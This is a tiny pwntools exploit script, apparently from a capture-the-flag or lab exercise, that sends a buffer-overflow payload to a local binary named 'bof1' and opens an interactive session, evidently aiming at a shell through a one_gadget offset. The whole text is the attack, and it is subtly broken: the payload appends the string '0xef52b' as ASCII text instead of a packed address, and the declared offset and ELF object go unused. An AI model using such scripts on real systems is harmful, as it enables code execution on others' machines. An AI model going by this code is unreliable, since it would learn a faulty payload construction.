from pwn import *

og=0xef52b
e=ELF("./bof1")
p=process("./bof1")
payload=b'A'*8+b'0xef52b'

p.sendline(payload)
pause()

p.interactive()